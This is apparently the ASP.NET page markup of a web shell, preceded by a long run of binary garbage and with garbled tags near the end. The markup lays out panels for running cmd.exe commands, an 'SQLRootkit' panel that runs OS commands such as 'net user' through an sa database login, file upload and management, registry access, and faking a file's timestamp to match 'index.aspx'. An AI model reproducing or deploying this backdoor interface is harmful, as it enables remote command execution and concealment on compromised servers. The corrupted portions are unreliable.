ÊªæX j¼œSI¼}xÇ6³ƒìñœÏşÒ‹Íºpµ¤{¾ı#nªÖU¬ğê:v…§F‡à˜NÔøphu[G™QkZ_~71ÔS[í¿B;¿†<ë3¥d¡å‹GşÂ=º/¬Šr2BZû×šï‡±“å&ºÿòá%–è@İøvÂ0j7î»ˆgíTÔ¹q@áóØˆ§ÍYfå‚¯¯ñ¢RµüT¹CB®£ş‡ì®ÏÕnï™»?”?kWÉÛËf5DEw"Ñêrñ’}Ó\®ÙÇï@€^í—Ğîñ4ÂÑX!*aM_Ècß):j¤:2‚LÉé[~ûÙ%÷Rô›G”&Ss
‚“6^¨²úÕ=L:XQ¸ìbZ´Ô¦‡•ÖCıYæ l#ëğOŒ)ğt®½nµÿ¢~2^¹óhZ.šØ×`a'qœ,ÅÑÊ*´«Jˆ&v
ByñxĞ¥¥Ã’Äûôh×Í”¦ÖwD@÷ŒıFFf‡ßGˆR‘.<eH®_º&&mq^ÆP%À(+ ›-ªW ƒÕØÁ3§!™À
$©à,K„Êx²Í˜bªÇ‹|†õĞê‘
R½åƒl¾PDåÕ·±ı$çÍàhÊƒR­&W»½TWÒ×D!×âäÏôì`úùÜ”ÄøËˆóPË
<;"×Ôb¨å§Èòd4ÇêödçìZÖ²ìºäLÃõrùÑúÂ6ïóƒ	ú”AÇ`«4ú…™.ÂøÄr¤³Hì”z`¾DÔ„%¬ÌBï“{rR*g\ ÉF7õ“iiIè'³Ï—“a¯Gv.Ód›¡ú¸—bö–êaÜ1L´´E>Õ„ˆSb&úÓ—fU~26Š¦dåA‹Twó¨ªµÃfbTØpR¹*7ÇHğ§Ù¥à9¬gíœÿuºÆ‘Î»·xÃƒiû
“Çµœ’cŠ¾“æ-û•¬üCŒa'ËOÚ`9]SÜPMYĞa|'{£KÓ¹wêÌ^…/şè)C@€šù#L:S~4òSà|µìúÃµÅ/øØ‡e.b•óS¤oDDè.ƒKÕª&ıPœsÑj&¡?AqÂúR†)Å_^1g†.ğU*©£÷u²QKå±<³€Ëé¢å¥—$2ü—€¡~
3w³"ĞdŒèñ¢bÀSOò=·£ŸOÎ–¹Ri¦jZ$ÖöhKMÖ—b›ªë·_”k}"mG€‹´¸,"ªçØßt¹•º;xSPÄ­šX&`B›©:4£ŒkSùÿ¥s[4[¹eYM{?¸·æGÏn
Wı½ı’¿a“F‡ß„êó´ DUjnãîKî¾ä¥FÁvN\¶]“”etÀ@‹æˆ¾+EÌq	UKĞ´X_qÀ3å{%€>@ä96n‹IáÏI_\Í¨-$Ğİ½ÇŒé	"øn<ÇÛşY;C‘2YÕ¶V|ãÈ5f86…°}ğ
ôbâ$—käfW~ü.—5ÎäL.¥qhĞ³¼ÚárC|¡tîYd'Ó#ßíÎYæ­Úœyş)k0sÃŞ)ØÑÇÀæ1äQŞÏ\Š¥yªÄ3ZîºD–ËİŸ‡bOYH]ebf¨îÅåö„`;æŸ’2îã•–H*@(¥Ÿ1ëĞÉòHÊ qOÕ¼ c¼O¿aÃë—R*<ÇöÜ‰ÚPaãê´5˜–ÑT½°P«}w›õø¸ÓÍTİŸßy¯š¶Ó ü’]7E\å‘²0P
ÈDæ'4^®ßº9rå¶°˜áv4•H
ÃJº…ooïîÎçwxV.ó!ÿeúç²d%HÚ„@èÚ¡x:ÿœİpR+Z]³û I+šr5DÈÏKrwO4Ô--XìåøÒé¡^Ğ·øB°J&h¨¦õ¸é´@á¬¬;åœJ)pì‚)&©3Äk»§½*>!€Ï	]&L˜eá”=ˆÖçWü›ì±V:øû¦=Œ`Â¶ü' løóuÎv‡Ó{§ç¿1-hü¬búµûfCÈ?ÿ‘øÏ»¤5Œw€ÈaU×&a$Ö&^”pqÈÖ[Â7
y8zİ°ŠmÚ”ƒşÄ>j£,YÔgUÅ,ëÈMaª!úÙ.¤”Ú¨ü«€;~–áÁÄóÛ¿³Dîp$­”·¼äXNŠad·ôÆºÄ¶ès+ƒLrİÆ?ÖpyÅÿGZgxâlò62ÓÏq:zòImñu¡Æ”ÌbpÖŒa:‹ä~íœÇ¼€¯]r ]¾£ëwJÛõí6¥ŠPFf¤÷~äÄg~v³"UÉÿœ!³)¢¼/öİ[=)™Ó"˜¯ÿrÊB\9ü„Wá.ø—h½äî.o>ÛLşÊOx›ÈdËµè„*>]åçÿëÌúº ˜J•‘¤=i,u_¥±ßÒ¥äˆ/±î]¥Vneü:U†UX@h;Id¹ê'•§îÒd¦W@b¢ü8Ûq2´/ì –÷bg/Ó3õy¸*9™	"3ñ“'»C™²¤‡;L\bU¯¶ß-
qP†aÅÂà¬VBéİÜÖŠ‘xJq®OÌü'’}˜Sp<)±zzù½
İg‰TW
n£mIšô}váæŞÜb´¸³¹?„Q½a â5å7¨Ãæ¤ô#*¸vG•e7G‰•'RÉfHVÉ“@÷¨Ã Ô%k¸‡‚$UÁ¢æ& ¯¡$˜u¯æÒ¾ãÖ¸vÂ‡ŒQÂ+ï¦Šìğ­ä!¦ëˆŒı¬sÓ)3ÑGÿÈ!@T“â $%Pª½åŞÂ.šá[	Ä~î¤xŒ“×Œ•üÁé´V¶³Fë…~Ø`ü}p	Õöcä4;Ã,‰)öcAòÍ¡ãÂÆŒ¯¤D°ö×ƒdÔ•8}ÆbbãÚ™tŒğ}öŸw¨ç…/şN?§;=9„2ı¸î½ô4rzNz“¸¾ª²ßh‰~r­†(R¬}™®àù”è™¾ñ ¹Y¨”6uHNa0¥şŠBî›M¡-©«–|mì¯Ğe3š"»ñbee{°K0òøÃ{coÇ±»‹a½45ÎúÈ>•4@$*xk·“¤æšLö»{{¨^æ=Ñ]œ“;¼n$~¥‹.]V%áXp«ñÛhreµë'¯òç;u­3šê/ã†ÉøN<tn5ØYÆõ"è;]ï@xIa®!Êx²èûú®¬	ˆòœºÌ£Æ++1–¨ï ìš<Yh«òé™ûcİğ šÔpÈÊmû-L8`£djò9A+iUøÁUãU«Sğ­šsÇ­D“Á¡ 2– ‡j!}|Y9î¶JuPªq†i´¶Šæì<ƒ/)1¼dM6}”ÖÊûëÊ™âí™]§¡M·aCYà,©| ~»"æ6¶ØÒò8‰èLAååÌDô~ñw©^õ;¡sÇ™V6!<wÁwt¬C¯Çû/*åeôI÷z˜AW`­¡å_¨DEî:xN©øî§‘G_”'Õ4‚EŒĞâQùæØ%2²?RÅFX­[º>EM?•îÕK+Úi‹í:ß–‚l¡'jCÆrè‹Øz•QËÄWáëO€ÿ‡95}”öl­öË¹,òFaKÒFpó/ßI$g¨,û`”QÂÓ- SX{ÊÚpw9§ñE >‘¢´&ÿÍ˜Ş¦”B¼Ã\3æ”ïg¦_4psR|bÖ~°ûnåã‰a8ä;DlèQuŠ‘~G_*‰q{ŸP·SÎ8Š:5ÎäÕQ×<İµ ‹»¦Ô,ã0WŠâ€=	î©“8ø}"eX@…iCïp‘`—…0ĞÖ`èõ<2´{ÿ½•F¹‚\7€©te©t²$Şœ¶šP´+Htu Zˆ³…©zzÙÿFeˆïÌ «l·Ô!ı£#:ØP¡>pİ'·±*  ÇÏç$ RÑ2 všÆÒÌ³ĞÅâÊÜ°-©^ÉDQé}ÄOï’(®‰À_†ş•…X‹¬Ì•;›<½ÏæyÌz¶‹¯ R—	Á8oOi÷£àøÊ8ZBXä9º»:t\±qHø“63
›¨¨ğú>H"&ûwvıv|:¤ÇÓô˜¨´LrÏ,ùÈ>vİ×-p>óRÌ+º”ˆ”cÂÀìriOn#óq¸èşXAJŞZFíğ¹)eÇW˜Àé}…aSÁeK;p—@ LU­Eù¥*Ó”c´²òb°Èª}
ŸÁ*øŒ¯Rn·a@§YîuRsÍ3a v€6.Ã¨ÖÇ@4YÂÜÉËáp³ï¸2×RvJÌV”2*‰®D`¨GîŠÃqQ·˜ŒPl§·0…µä@°Dë^×PÍ&”Â.†˜y$^Å,.{:^Ûdw4ÿˆÏ€ViHşâ™ÛèïôíLÅ¤ZÉ ĞPvs¤øçê7à=q­.Ãy¾Ø@-)äO­­˜¢’æêK r³!KØÍ”nÖÈ£'ÂhV((Æõa4@€'œMÏ´¿<G«.GPl³krDöMô.*ô&soá?‚¬>"²?;‘èÑ|Ç_ŒÅE>¶,( ¡Î÷+Ê:xG»í-oqğ(<äWFpµ¿$>V%VîàŒmQY½ñx-‰˜Šã5§R®qÓEtü" àòû˜ıW’_Â‚ovñ“bP…$Áö&Û°@n5Œ°Âw§šÂ$ «+©6·£»¦–½f•3Ã.ı½ÚÉ[ë8c«™T;}ÿğ.ÄQüîé½ûÎÿúPl“•õĞƒ1?ĞüøØ;ëÚ½^ŞOÆÈ6Îw>+_,á«rûŠçí¹{±£ŠCxGhNŠ‚Ôø‡ô¤[¤*Ÿ¯ÓñLqêV¨/ÍôØMë¬Œ7é„¢7âxÜÒ0À4Öt»õ~x’¿|;-È-ÎÔ‚¬ò¬-SæOÁÜnïkÛˆğŸ
HŸaEm_±3xç8öÉEˆèt¹€Ù`yT'Ş"–ƒ Á
7Ö&ñu²^°û¦yñPHÕDlí€şëE÷ò‘3ùwD¤Š6/´r+….4tëƒM³ÌY—<"åÖC]¼Qå¾¸[‡‘EõÕ¥×“µâÜ*&b.B›kÔ«gÕoNL’U¼<k1½`ô;‘^gÒ¹@˜;¥Ö<çXøT¢F”ú›¥‹èoÜ§åŠ¸XÚYğ¨ÜÙ¯­‡=gÁW\I'Ùu[?ÙŞ½6*şZnK-™!W.¢8¨òƒÈà
ğé[ë’í'õÇìŞ`ñÙJÒûèøÃOØåL¹R$
›Í=¿Êªìğ„rÛ)s¥U¨ƒ¶'j×İ®qÔ
¸º…*y7rÑ-¯iÏ&i\1Ã^2N"õı;K*Œ}:7/lâp31eÉUIE{ĞŸ}ş.¹³B<±§Jëå²Cœ½hm¨V?«$¿Ú8ÃÒƒÇäH |ñ|ÊG¹'Çî‹lty,&³ËÙSßÍæ’à¡À…@–,]:ézü`îô‡(Éeqtµğ»îe±‡ƒÙ…a×v¢WaĞ^N+ä½È²ÓºçÒmhl'ƒ¸×‘Nµ^ÛfGvğ8º_¹ãFsá÷íQ3q²Ö 5Ç­ÜÍöF€ĞÂäÒ-„T¿ş²m†ÀV
<—âıœ›ã	üŠ°ïUÅW¨àJ”—ˆ^º†Á+aêUÜ9ë·ë3Ævılhšj·bÂºMé©àê`¯´qAé½h·ÇÉ'ö:DOóÌ÷ºá°TÒ‚å5é[ÛºØpoeV{mˆ•'ü[ï:!.y#ŸJÏâˆê6lD…ğdÀ5ozÏlØ“î‡!¬ÎÆ1Šœ”¢cÃ‹ŸvlÇz>uıÊŒñ!e_t²«®÷ÀTÖE
ÀŒWÕÁÆ2±£ºşãu^·13®§ÒR¾¨Şéói—ßM¾,k‰"azÔ¢ım@Ë»%–Kµ·4äªFFw¥ ò×’Òíæ¢öÀH¿”Ñ
uëÃÎ‡ÆœÂ5?7´^YÉoñ¬C
eGn}' ± ·†iGwúî®Zo¼Üú8ØXišÕ¢h„Ïï@tX!]®ûÈøÉœÿşPK@†A¸	|!Ó´˜y´˜Œ C	‰?7°APşêFaİßŠ“ñµ¯çémpÑíwÎbwy¥¿ °Üÿò¤¢îd…ui¸I şŠâŞB¹’ï”7^É8™ér¥a@‚Àx¤ƒöU$PĞ›âàTô¥A¦¯“-‰EÈ•2;e;·pvŞğ÷;kÄÍZ8ÂİfZƒµ ¾¡4J°q¼r(ã#Ñ‹İ©èÁß>LI®tOø½œ,bmˆÇÍoC¤÷“:3¢C7'îê­éd(& ¿Æ¿npz*fÛï‹~gÂåÍàQÚ»‡8¼ğ™aÚÖË¤:¡ÄßÂÃÏ¥Çà¶FÄ„ÿJ+Ñ8ªÛD•Î¹uç…QkÊÆvó—·nkÄBóÉÇˆÈ¼'ûÊm5„Ç#újmEMi=$Æ@üe|³àlä¨@t_»„)Ö¢UÜÍÿ"ñá³î;®FÃ[]èÒËÈçWü\¥mvŸçÜ‚¿TææxÎ[é~óh×:Êú¶»Ìrel’Æ¼¥NÎÈ‘»gÔ„¡r²=†ü¡ nÍ¦¹,‚ºØ¹‹p´¸·\ÎòDLín…ŸrzÓÀb
¡mmOèáÃ·ÿñ¬™OfŞ´WF½A/Ù"F7U‹Z°£-yMP¼·ĞéôE9ëZ¯uœñl˜j¡úíêé7.û’’ûŞÃas’°ÍİÆ ;à†^Ç“y‹ëë¾‹ü‹7Õ»_\øƒ¥Š)¦¼4*ïÖóº’SÇƒkÿfüJÚÉ…­]bø-ëşÈ›\‹J—ÒÅ¥ŞyÜÜ³¬YiŸµ|Ü»zFÛ¶µ‹&A9\·fğ±)AÁÜRöAÄ‚Æ t"Ç º	ƒ$V"JÌÏóJ;S5ä~B#ŒİY½†Å¬_/}ˆÿùËD•±·	TšĞYĞíü^È)lªÜEc¡Fî.Ÿ+:¬Ñ@U¥¬ôÓó_`ÕúÂO±‡*©"‘Uñ&³\ÕÛ±ë/o5m%òÿ­Ó~ZŒÔ¿¸OfxÊÆÜÊ{Ğ(µ‡¼êĞÏ@è¶z)H{Ñ© ·\y?çfŠ¿ù<øÔ˜òÀ:†‡h@â>-©Ò®]<kI(ñZß#3q.sŞ¨‡Ö=?‡4«ä,(VŸÉØ#ı‚¥keøí—ëMg’¤ÔøÌH»kyùü¥Šé»GrÑjSÉŠé'ÚHÀÔKL'ïCİ‚çÈc/9Şî»ˆC|Úì å–q¯IH^"w:F–š‡ù’ŒÀíkzáÛÍ[]™‹ÀgGÎoê©ÌqÜúÇóJ®]'uÂïÍÿ0’ÎPu	»2˜ÏÁÔêfuó‚±¡5:¨ªZê êc]Ÿ­¡!@ó9ÆO‹¼²(·ó‹Yx'Şh©¯[ÓÆ^²ø¬ƒŞ§ÿ\Û€×b·)Ù…Öì«d—5°ˆöuúˆ ;’q·+‚â‰`#5»9I‚6.‚­Ó$¼*…%ËƒÏÆ¶sè=²^+IÍÓ/í7‹ú6öãS­Ğ…Œš¤`Ñ¢u„É‘m[Î$Îæ§¾¥àõ¸[÷À³„íÇ¦3\Â$şıâ±ê;³½ÅüîVß½1ã:oÏQ·Âö£C?¥¤#E'A“C®²Îs»›Ö-µÈµ„mÖÔ'+çqÂ{Ÿíè-VŞÉ ¤eu”g“wñãîc½¸C9dOwZ¼®AúbQA&¦hl‹`P•ÏÙÆ'w^¹Ğ.ƒ5K\ŒÜ½vn£ÎusIW†B¾Ìşoóü·ò|1ù›63*p}ELóîÓEÓÅ¼ï>lÓ}ëzë•È§‡3h'o>`+ÚZ;	ãı·ÿÖÁâÔH]ÓÒK£L¹{yã+^©ãÎ]'ÇEG]ÂwõÊX·ÃR‘lÁšûXQj¢{~Ès‚ˆgÓae"¯ 1ãtC²ÆÆUŸ€¤êíd!ìÄø=9ÄûK1ÿä=Ñ.ÕÅ`-lO9IíÏyÏ‹‹)Æcü"“ÑòßS«?ùf×ê°`Ó±ê+"93Wâ»+k.ò7äTÈ¸B„Å¾‹æ*6wBÈõÙ ÀãP1}Qëoæ‹ße¸Ä@&§™—hØ÷=Îi,;"¨†w-ÿz×^“ÆJ>jdš°e—›Â?æ{©Šst«@‘Mp5ÿµäòçVå½Ö<µ0¤81ê«pçÊ-6ü.h¹ÒåÖˆùV˜™‹Ë©’7sˆja…Ÿ¯=ªõ¶–ïõœ&£p4ôqîöw¢ó>œ7†×™z÷*1ìüôÔeV½ÖafĞë%µy#tÔ3ÊòÊGy|~¦£ñ²Z”ÛÉ–NÄW9À¸&³Meëbd>é~<£ã#éæTÌ¢à!½}ŒüÆ—@j¶dÙ‰O3†NÒÃ2L>;å”ÈÉ®
p8øø#Ò?aŒÃ+CĞq›Kï|Gmœ·Â=UÀÈgœbwÒIËù	r€*p_ˆRõğÑ´:ÿZ»ô«§Çş(Ér5:3¨¥7`mÿáGĞš õ´U ¬V7¡|Ì‡ÈmV°\L‚?OòƒÓ•=–"å©ŒåßáKMÊª zHÒ<>/<}p^ m‡«]déÎ››f‡›&”8Á‡µh‹ ¶ñÜu×i{¶¦é³§sÓ<øuwô9£½ƒî¼…m¦å˜¿×Ü˜›„”óŠ¤gÒGoZñ°^Ø'˜Šœ5—l˜T§PğS(á9Ó'8“CbÓ ^ûğY+"«±Gú¯Û…ŒX”ÒTA`÷…û8Õ®ÎxkêRXÎØl~Mmà×!w®ƒ¯yø½b™æ+NqÙVyR[3Î^/å1ˆ×Øã:fÎ;‘Zá`ÅÎ'~0W*z8É»=¡Ò¤w†8ˆ±I;¹¦Äı·S†éMf£»\¶Ä³ nd?ë¸ë¬ˆ51„&¸Š7£ˆ-êÿĞÛö
¿vkâ¸¡ÁÊ T{<ä)SU<¥¶¹Êù1	÷OÜÑA–›èzØt‹RH³sû=€º5§kñ¾…z°ÇluqeéÜÏîàëâfÖ¢‰në¢Úgk[n0ÒŸ4²yM$„%ÇnJ]&˜õˆĞLâ9£7Ã‘iX‚§bE$ıÄÿm¦|«‰÷;JXöõ°Èı³µØ~µÈØ‡q¶E.‹MÙ;¨ª¸İ®Â›P®bS#Ì†
^ÕWsqš\Û( L¡ñ¼PÃ=\ô÷‡°ÚÁÀd1q¼‹:»Û,>¿Ç©sàô]ÓÈ$y®§~QÅîóA6)4jŸåï’H»’ _‹­W*òÎpc§¹g˜Z³-ÆnšÌÍ=ãì\Æ’¥ğÙ¡"y5¿ ÌÀiWLŒÛ˜¶~•`|ƒÅ³*¶=6!´±8“+bãÜx9;ì:àí26Ê!*#ÈM¾²pâq1àõ×2Qˆù¼!(ohªeR.3Kv|N6‚Ş­kş.àÁb. r8áœSıºYz!V²úÆšÍ†Ûä*hú^ükÆ)J#í¬cÿ»“J»½²¬u¨˜`§»º·Ğ¦zQfö¦Åi`Õ-ÙFë«å´›˜5ò{^şº®^ÌmEÍ_¼^…Sû 3i6# ,lÙñÓ¶gùŒ]ï`Céê©sÕD¼w›G?PãZ7ş¸<=s•ºUÏaÅ¿ªªSû6œ)kÍé’Æ*íä>xEDà(=Êr;î:–¯ÚİVÎiit [š+\aãYSüuH› ^Î.ğ8¯¯	`L„Ø~Ş…‹*O£F¼$|SÀRâ‰¹ÀN¢p„ÄkajĞ/\²1´Ç±Z!À|ab(—•¨ÏÑ½$_ÕÜß	>'aF<­µù3îMİâ[‘®j¶ƒ¯IgH_ûTÂa pd.,Ä—‰=Òª£Ğš)çÇÛ†jŞcò~èW¾coH h¹ĞQìßí<ïãÍÏû;¦Ìã…Û1ÿ#JĞÛü®'_†TQèâ{Znè”ÒQ©ì]òÚ="«³¿œ}O;à1\OŞµJ{GÙÏ½Ó>7`=ÃÈKÚ¿_Šã.¸ãëBœ%aÍ1%Úfó3¥saíŠ?ƒŸ6º8ªLòf€	H­BÙ¦ÌDû>y/V°_ûÌûŒ(bQµ’©Ì%Ú+$ÅÁ>Ûï}0–³üF/•ãRî´°Î|¹»·u¾	Æ©—¶¸×3Chª!ş‘,¿²ÚYü¢¡w¥×Y×­#eøµEÛuRŒ•î‚Q;ÍVÔÖÿò Õªõ¾
4g´ÙD1ŠŠT]ˆ%ò0£Dï~Ô~Şmu°œ:AÍ”ÔŞ›‰¢øÏ`:+˜^l{ÁæóU¬O¯Ş·HW±‚aJØ"Uwåtğë*E;ú|÷¶VŸlu3ïFqÚE†Ğá¤åìoór¾…6±_<T*³Ëd…yÔÌ*,`- „‚Dñ
¨f¦ÂŸÇ±Ç!9¶²VÁÌ*]ºÖŒ/JükçÜ@‘õYkÎ}À)y_c€ÙpĞ>œm4Øù’úœ	áë±&hàÉû&$Q›s—ÔUİã›lEn0(tHU³Bhû÷æ!³ î²Î¨B<N—àoã!m?"[™—ÒÈ˜Ú¢
"¨Ï{DÃê¼7;ËÎhº—×¼2’.ÇC“Ùşp0hœ™éı#ãm¤Uá(ê:ùJ*K™„¼U<€yŸXè>¹i@Ê?{º
ÎÓJ0ÀPì>1ËåØ€uÎoJüoÏ/dÓ“‹v 
“å«¦¿Ga2b<ÎÍkÁ=ŒZv·éc [ïùóŒ	cšŠ¤¢¯î{Ò¹1ÈGØÿG)v¢­høUÓ…š¶ï9³×¢7s|#èq`£ÄŞx±¾ñ!÷õ;½æ,˜àşÍ‘8Ñ¶¿{Û8#*1FOºí3'‹•­º€L_¼-¡ê‰A­C`¹Ø‰Ÿí;bß[MwÖ=5pY¸fî¯?âjn×:&fnY’g›ºÁqZ*˜%Hœ&88ïÍ"=tiUQ>‰Û—ÏçÊÚØ\ ëGm—é&šnÏCµQª"yû<ßO%,LÓ,BÄrN#fjOÏÜXHk¹bMIõdœD:pPÜj=u]¬ôN5zö€jÅËÛğí±M>‰Juâ±ÄßÅ¿½U.C¤ÈzÂ0U\_ªz†Å«@Œv=ÕãC¸(¨k>Ó•Ñê!LÀCñÑ^àÆ%½Ip]@ıê–M(`9uáİ”ÄiĞNÃŒĞîû9d¨R;˜ddºêöD¶6‡p}@şÀ»Œ§‰N³F6Î©(>CH{×,£ -û·İ<5ëécUk°\|ú{h¬ÏBâëâşMiİ-]“a[HØişGL±¶}ûáwë”WeÅËX6z4´3ı`ô~ÜªD+Òs> buuÇÛééÉë—×]}>2³YLrÓf?‡øûyĞfÎ×øTôíbEL×ôæŞsvkImZ¼|¶4&®}±hÃ»(>Óå%œ’+ø·Æ‹ÜX_wÁÇœ`¬ÚÀ@OP`¼lİĞ	ÓŠ*(×0™92Sà±ø;¼Ú„Û8(äÚ3xöÇ#ò=èê
àŠã¹Ÿå(”™®Z3™Ó8fi“CÑ
Å$±m¡îÌs™ßqË”§S†Şiiê‹ğVjØŞsOşò¦Şp9‹G:æŒ9eÍY±…Ïé•¡òºöG&R/òsÛf·Œ… Í½c}ZÄHt|AoEª‘PVö‡
PIyB=ÙÎLM•:ËJæÍ?YQ&òW+äò>ßHZjp˜t¹	•ºGx»ˆÍôé3‰œÅVÉrÛ×0ğ€öù!Ûë¿œÎQ`Ô"y¶J¢º'íE|dR$âQc¹P÷}	¸…kKDWOL±eêK¶.Ñ˜Ü­g´´ùô 
Iëæ€Î-Jìc	UK ³X_yT¨ğO%jİ$/ô€	t ²÷ÌJˆ+×œİxì`eO¼/l©n´z°û¼cëªşÃZ¦®Ò¶‡ 	T¿öƒzñÒ¾mY‚Ó3C;ƒ©”êÄ6U:Sw÷vKÿßğû5hXEs­G™ñú'ØÖœvÆ»Ìıˆ}óP¢‡”ŞhøÏÚ@—Ìy¯É‘Ë/u×Rû#56ÁÕ¤DÖFpÒéà¹ºá´j¬ I#µ§Ç‹sÕÌ…9©*C”'ß5R‹s)Ÿ
[ıRH<YÛDP6\"…x%Ô„t÷iÿQüö>¡ß¨ñ m/™.?u¡tton>
            <asp:Button class="buttom" id="Button_sqlcmd" onclick="Button_showcmdshell_Click" runat="server" Text="SQLRootkit" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_sysinfo" onclick="Button_showinfo_Click" runat="server" Text=" SysInfo " Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_db" onclick="ShowData" runat="server" Text="Database" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_reg" onclick="ShowReg" runat="server" Text="Regedit" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_about" onclick="ShowAbout" runat="server" Text="About" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_exit" onclick="Logout_click" runat="server" Text="Exit" Width="80px"></asp:Button>
            <hr />
        </asp:Panel>
        <asp:Panel id="FileManager" runat="server" Wrap="False" Width="100%">
            <asp:Label id="Label_Drives" runat="server" enableviewstate="False"></asp:Label>
            <br />
            <asp:Label id="Label_Dir" runat="server" enableviewstate="False">Currently Dir :</asp:Label>
            <asp:TextBox class="TextBox" id="CDir" runat="server" Wrap="False" Width="300px"></asp:TextBox>
            <asp:Button class="buttom" id="Button_GoTo" onclick="GoTo_click" runat="server" ToolTip="Go to the dir" Text=" Go "></asp:Button>
            <asp:Button id="PlasteButton" onclick="Plaste_Click" runat="server" Text="Plaste" CssClass="buttom"></asp:Button>
            <br />
            <asp:Label id="Label_oper" runat="server" enableviewstate="False">Operate:</asp:Label>
            <asp:TextBox class="TextBox" id="TextBox_FDName" runat="server" Wrap="False" Width="100px"></asp:TextBox>
            <asp:Button class="buttom" id="Button_NewF" onclick="NewFile" runat="server" Text="NewFile"></asp:Button>
            <asp:Button class="buttom" id="Button_NewD" onclick="NewFolder" runat="server" Text="NewDir"></asp:Button>
            <input class="TextBox" id="UpFile" type="file" name="upfile" runat="server" />
            <asp:Button class="buttom" id="Button_UpFile" onclick="UpLoad" runat="server" Text="UpLoad" EnableViewState="False"></asp:Button>
            <HT>
                <br />
                <asp:Label id="Label_files" runat="server" enableviewstate="False" font-size="XX-Small" width="800px"></asp:Label>
                </asp:Panel>
        <asp:Panel id="CMD" runat="server" Wrap="False" ToolTip="CMD" Visible="False" Width="380px">
            <asp:Label id="Label_cmdpath" runat="server" enableviewstate="False" width="100px">Program
            : </asp:Label>
            <asp:TextBox class="TextBox" id="CMDPath" runat="server" Wrap="False" Text="cmd.exe" Width="250px">c:\windows\system32\cmd.exe</asp:TextBox>
            <br />
            <asp:Label id="Label_cmd" runat="server" enableviewstate="False" width="100px">Arguments
            :</asp:Label>
            <asp:TextBox class="TextBox" id="CMDCommand" runat="server" Wrap="False" Width="250px">/c ver</asp:TextBox>
            <asp:Button class="buttom" id="Button_cmdRun" onclick="RunCMD" runat="server" Text="Run" EnableViewState="False"></asp:Button>
            <br />
            <asp:Label id="cmdResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="CloneTime" runat="server" Wrap="False" ToolTip="Clone Time" Visible="False">
            <asp:Label id="Label_rework" runat="server">Rework File or Dir:</asp:Label>
            <asp:TextBox class="TextBox" id="time1" runat="server" Wrap="False" Width="400px">c:\webadmin2XF.aspx</asp:TextBox>
            <br />
            <asp:Label id="Label_copied" runat="server">Copied File or Dir : </asp:Label>
            <asp:TextBox class="TextBox" id="time2" runat="server" Wrap="False" Width="400px">c:\index.aspx</asp:TextBox>
            <br />
            <asp:Button class="buttom" id="Button_clone" onclick="GoCloneTime" runat="server" Text="Clone"></asp:Button>
            <br />
            <asp:Label id="Label_cloneResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="SQLRootkit" runat="server" Wrap="False" ToolTip="SQLRootKit" Visible="False">
            <asp:Label id="Label_conn" runat="server" width="100px">ConnString:</asp:Label>
            <asp:TextBox class="TextBox" id="ConStr" runat="server" Wrap="False" Width="500px">server=127.0.0.1;UID=sa;PWD=;Provider=SQLOLEDB</asp:TextBox>
            <br />
            <asp:Label id="Label_sqlcmd" runat="server" width="100px">Command:</asp:Label>
            <asp:TextBox class="TextBox" id="SQLCmd" runat="server" Wrap="False" Width="500px">net user</asp:TextBox>
            <asp:Button class="buttom" id="SQLCmdRun" onclick="CMDSHELL" runat="server" Text="Run"></asp:Button>
            <br />
            <asp:Label id="resultSQL" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="SysInfo" runat="server" Wrap="False" ToolTip="System Infomation" Visible="False" EnableViewState="False">
            <table width="80%" align="center" border="1">
                <tbody>
                    <tr>
                        <td colspan="2">
                            Web Server Information</td>
                    </tr>
                    <tr>
                        <td width="40%">
                            Server IP</td>
                        <td width="60%">
                            <asp:Label id="ServerIP" runat="server" enableviewstate="False"></asp:Label></td>
                    </tr>
                    <tr>
                        <td height="73">
                            Machine Name</td>
                        <td>
                            <asp:Label id="MachineName" runat="server" enableviewstate="False"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            Network Name</td>
                        <td>
                            <asp:Label id="UserDomainName" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            User Name in this Process</td>
                        <td>
                            <asp:Label id="UserName" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            OS Version</td>
                        <td>
                            <asp:Label id="OS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            Started Time</td>
                        <td>
                            <asp:Label id="StartTime" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            System Time</td>
                        <td>
                            <asp:Label id="NowTime" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            IIS Version</td>
                        <td>
                            <asp:Label id="IISV" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            HTTPS</td>
                        <td>
                            <asp:Label id="HTTPS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            PATH_INFO</td>
                        <td>
                            <asp:Label id="PATHS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            PATH_TRANSLATED</td>
                        <td>
                            <asp:Label id="PATHS2" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
       $   $ 0          <td>
      "                     SERVER_PORT=/td>¨   *b   !              <td>
                            <asp:LabeÌ id=bPORT" rulAt="server"></awp:LabEl<<.td>
                !   </tr>
                    <tr>
                        <td>
                            SeesionID</td>
                        <td>
                            asp:Label id="SID" runat="server"></asp:Label>=/td>
                  0 </tz>
                <?tbgdy>
    "       >/table>
        <?asp:Panel>
        <asp:Panel id="DATA" runat="server" Wrap="False" ToolTip="Manage Database" Visible="False">
            <asp:Label id="label_datacs" runat="server" width=¢120px">ConnString :</asp:Label>
            <asp:TextBox class="TextBox" id="DataCStr" runet="server" Wrap="False" Width=¢500px"~Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\MyWeb\UpdateWebadmin\guestbook.mdb</asp:TextBox>
            <br />
            <asp:Label id="Label_datatyp%" runat="server" width="120px">Database Type:</asp:Label>
            <asp:RadioButton id="Type_SQL" runat="server" TexT="MSSQL" Width="80px" CssClass="buttom" OnCheckedChanged="DB_onrB_1""GroupName="DBType" AutoPostBack="True"></asp:RadioButton>
